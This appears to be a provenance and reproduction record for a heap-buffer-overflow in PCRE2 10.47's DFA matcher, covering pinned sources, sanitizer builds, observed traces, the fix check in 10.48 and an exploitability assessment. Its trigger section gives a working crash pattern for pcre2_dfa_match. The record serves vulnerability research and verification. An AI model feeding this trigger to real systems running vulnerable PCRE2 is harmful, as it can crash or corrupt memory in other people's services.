# PROVENANCE — pcre2dfa2shell (CVE-2026-86145)

All fetches were read-only provisioning of public sources. All execution was
local; no external target was contacted.

## Pins

- Advisory: https://github.com/PCRE2Project/pcre2/security/advisories/GHSA-3r4p-g7gg-ppmf
- Fix commit (raw `.patch` fetched and read):
  https://github.com/PCRE2Project/pcre2/commit/c932e70451eafef922ebef364ac25042f0031135
  Advisory cites `3979bb90cc692a371d33e6b159dc324f27361deb`; that URL 404s.
- Vulnerable tarball: `https://codeload.github.com/PCRE2Project/pcre2/tar.gz/refs/tags/pcre2-10.47`
  SHA-256 `409c443549b13b216da40049850a32f3e6c57d4224ab11553ab5a786878a158e`
  (extracts to `pcre2-pcre2-10.47`).
- Fixed tarball: `https://codeload.github.com/PCRE2Project/pcre2/tar.gz/refs/tags/pcre2-10.48`
  SHA-256 `38c2a44986d70050f5fc8219901de87fc32784ab271d3c7d4400683a0b76794b`
  (extracts to `pcre2-pcre2-10.48`).
- Source check: 10.47 `src/pcre2_dfa_match.c:426` `if (rws->next != NULL)`
  with no size guard; 10.48 line 435 `if (rws->next->size < requested)`.

## Build commands

For each of `pcre2-10.47`, `pcre2-10.48` and each compiler/mode:

```
cmake <pinned-source> -DCMAKE_BUILD_TYPE=Release \
  -DCMAKE_C_COMPILER=<gcc|clang> \
  -DCMAKE_C_FLAGS="-fsanitize=address -g -O1 -fno-omit-frame-pointer" \
  -DPCRE2_BUILD_TESTS=OFF -DPCRE2_BUILD_PCRE2GREP=OFF -DPCRE2_SUPPORT_JIT=OFF
make -j4
<cc> $FLAGS -I<build>/interface harness/dfa.c <build>/libpcre2-8.a -o <build>/dfa
```

Plain builds use `-O2 -g` and no sanitizer.

## Trigger

Public APIs only; `harness/dfa.c`:

```
pattern = "(*LIMIT_HEAP=4)(?=(?=(?=(?=(?=(?=(?=(?=a))(?R)))))))."
subject = "a"  (length 1)
code = pcre2_compile_8(pattern, PCRE2_ZERO_TERMINATED, 0, ...)
md   = pcre2_match_data_create_from_pattern_8(code, NULL)
int workspace[20000];
rc   = pcre2_dfa_match_8(code, subject, 1, 0, 0, md, NULL, workspace, 20000);
```

## Observed output

- 10.47 GCC ASan and Clang ASan: `AddressSanitizer: heap-buffer-overflow`,
  `WRITE of size 4`, frame #0 `internal_dfa_match` at verbatim
  `src/pcre2_dfa_match.c:686`, frames #2-#7 at `:2808` (six `(?R)` recursions),
  #1 at `:2978`, public entry `pcre2_dfa_match_8` at `:4027`. Full traces in
  `out/pcre2-10.47-gcc-asan/` (stdout captured at staging) and
  `evidence/clang-vuln-asan.out`.
- 10.47 GCC plain: SIGSEGV, `rc=139` (`evidence/plain-vuln.out`); the write lands
  in unmapped memory without ASan redirection.
- 10.48 GCC+Clang ASan and GCC plain: `rc=-63` (`PCRE2_ERROR_HEAPLIMIT`), no
  report (`evidence/clang-fixed-asan.out`, `evidence/plain-fixed.out`).

## Harness precondition (negative)

Passing `workspace=NULL, wscount=0` returns `PCRE2_ERROR_NULL (-51)` in both
trees; `pcre2_dfa_match()` requires a non-NULL workspace. The harness was
corrected to supply `int workspace[20000]`; no library source was changed.

## Ceiling

Rung 3 verbatim (ASan-confirmed corruption via production public API);
rung 4 PARTIAL (lab OOB write, but DFA state integers rather than
attacker-chosen bytes; no pointer/allocator primitive or adjacent field
control). No wire/request path, no r5.
